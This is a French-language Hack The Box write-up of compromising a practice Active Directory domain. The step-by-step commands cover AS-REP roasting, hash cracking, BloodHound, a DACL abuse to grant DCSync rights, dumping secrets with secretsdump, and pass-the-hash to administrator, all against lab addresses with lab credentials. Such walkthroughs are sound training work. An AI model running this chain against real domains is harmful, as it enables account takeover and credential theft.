---
date: 2026-04-22
tags:
  - htb
  - easy
  - AD
  - kerberoast
  - bloodhound
  - dacl
  - secretdump
  - dcsync
---


# Recon


TCP scan : 

<img width="954" height="724" alt="image" src="https://github.com/user-attachments/assets/d7579f54-1268-4715-83a3-f5795b62fa1e" />

<img width="921" height="487" alt="image" src="https://github.com/user-attachments/assets/90e185b2-21f9-4174-832d-f1c0c7de0903" />



Je prends note des éléments importants.


enum4linux : je retrouve beaucoup de choses comme une liste d'usagers.

<img width="525" height="655" alt="image" src="https://github.com/user-attachments/assets/e4b07527-f04b-4442-9ddc-03a9e29830da" />


Je filtre la liste avec `awk` pour extraire seulement les noms d'usagers que je vais mettre dans une liste.

<img width="780" height="696" alt="image" src="https://github.com/user-attachments/assets/fb43dd76-e13a-40b8-87f5-597dfbe6c7eb" />


# Exploit



## port 135 rpc


Rien. On a besoin de credentials.

<img width="654" height="104" alt="image" src="https://github.com/user-attachments/assets/bec0192c-6410-4cfb-8190-819d6593bb42" />



## port 139 / 445 smb


Rien non plus.

<img width="821" height="557" alt="image" src="https://github.com/user-attachments/assets/240c02d2-9d33-48ea-afe4-326244e59b3f" />





## port 389 LDAP


Je suis capable d'interroger le port ldap.

<img width="824" height="637" alt="image" src="https://github.com/user-attachments/assets/cf27ae20-ef1d-49df-b94c-5e6088b66ad1" />



Il y a beaucoup d'informations et je n'ai pas pu trouver quoi que ce soit.

## as-rep roast

Je lance la commande et je trouve le hash d'un usager : `impacket-GetNPUsers htb.local/ -dc-ip 10.129.24.99 -no-pass -usersfile users.txt`

<img width="949" height="836" alt="image" src="https://github.com/user-attachments/assets/531e15f1-ae81-45f5-a216-3e7ebe6ce2c9" />



Et je suis capable de le briser avec hashcat.

<img width="921" height="780" alt="image" src="https://github.com/user-attachments/assets/e1e5d9af-fb5a-407a-a99b-b63561db95c9" />


Donc le mot de passe pour svc-alfresco est s3rvice, que je prends note et que j'ajoute dans ma liste de mots de passe.


## svc-alfresco

Je me connecte sur le compte trouvé avec evil-winrm et je trouve le flag.

<img width="704" height="356" alt="image" src="https://github.com/user-attachments/assets/e6002004-7c67-418a-acb6-629dc5df4683" />




# PrivEsc


## Bloodhound 

Je ne trouve pas grand chose donc je vais utiliser bloodhound. Je commence par collecter des informations avec cette commande pour ensuite les ingérer dans bloodhound. `bloodhound-python -u 'svc-alfresco' -p 's3rvice' -d htb.local -c All -ns 10.129.24.99``

<img width="937" height="303" alt="image" src="https://github.com/user-attachments/assets/18530252-8732-447f-9592-72c8551994bb" />




Sur bloodhound, on retrouve que notre usager a GenericAll sur le groupe `Exchange Windows Permissions` et, ensuite, on a WriteDACL sur le domaine pour avoir accès à administrator.

<img width="1390" height="568" alt="image" src="https://github.com/user-attachments/assets/734c1c09-b0d5-4ae1-9068-7ef8e441a4c2" />



## GenericAll sur Exchange Windows Permissions


Je l'ajoute comme suit : `net rpc group addmem "EXCHANGE WINDOWS PERMISSIONS" "svc-alfresco" -U "htb.local"/"svc-alfresco"%"s3rvice" -S "10.129.24.99"``

<img width="991" height="371" alt="image" src="https://github.com/user-attachments/assets/8379ea70-cb13-4da6-a93e-67c0211283ca" />



Il n'y a pas de sortie pour savoir si la commande a fonctionné. Je me reconnecte avec evil-winrm sur svc-alfresco et je trouve que mon usager fait maintenant partie du groupe voulu.



## WriteDacl sur le domaine


### Grant dc privilege

J'ai trouvé une erreur, mon ajout d'usager est incorrect, ça ne fonctionne pas.

<img width="961" height="237" alt="image" src="https://github.com/user-attachments/assets/fed6a1c5-a1ec-40a4-991b-728d40173ab0" />



L'erreur que j'ai faite est qu'il ne faut pas spécifier le nom du groupe entièrement en majuscules. Mon usager n'était pas dans le bon groupe.

<img width="1234" height="75" alt="image" src="https://github.com/user-attachments/assets/e430da96-e395-4b5a-86be-abcfba17098b" />


`net rpc group addmem "Exchange Windows Permissions" "svc-alfresco" -U "htb.local"/"svc-alfresco"%"s3rvice" -S "10.129.24.99"'

verification du groupe : `net rpc group members "Exchange Windows Permissions"  -U "htb.local"/"svc-alfresco"%"s3rvice" -S "10.129.24.111"` .  Je trouve que mon usager est reellement dans le gorupe.

<img width="1188" height="99" alt="image" src="https://github.com/user-attachments/assets/d51b921e-220e-4a87-9fdb-e409cfc8d327" />




Par contre, si je ne suis pas rapide, mon usager est supprimé du groupe.

<img width="1222" height="295" alt="image" src="https://github.com/user-attachments/assets/ac8605b9-227e-47eb-b0d2-9be539463056" />


Je vais donc chaîner les commandes ensemble.

Pour avoir le privilège de DCSync, je vais rouler cette commande : `impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=htb,DC=local' 'htb.local'/'svc-alfresco':'s3rvice'`


Donc je chaîne les commandes d'ajout de groupe et d'ajout de la permission DCSync donnant :
```
net rpc group addmem "Exchange Windows Permissions" "svc-alfresco" -U "htb.local"/"svc-alfresco"%"s3rvice" -S "10.129.24.111";net rpc group members "Exchange Windows Permissions"  -U "htb.local"/"svc-alfresco"%"s3rvice" -S "10.129.24.111";impacket-dacledit -action 'write' -rights 'DCSync' -principal 'svc-alfresco' -target-dn 'DC=htb,DC=local' 'htb.local'/'svc-alfresco':'s3rvice'
```


<img width="1228" height="241" alt="image" src="https://github.com/user-attachments/assets/5a759f37-c5c6-4413-9ca4-2b090c0ee232" />



## DCSync

Je peux entamer le DCSync avec secretsdump :
`impacket-secretsdump svc-alfresco:s3rvice@10.129.24.111`

<img width="1100" height="685" alt="image" src="https://github.com/user-attachments/assets/645e5661-9895-43b9-9f27-de856beb880d" />



Je fais du pass-the-hash pour me connecter en tant qu'administrator et j'obtiens le flag.

<img width="622" height="460" alt="image" src="https://github.com/user-attachments/assets/814fb29f-a44a-40d6-945a-597599106b3f" />



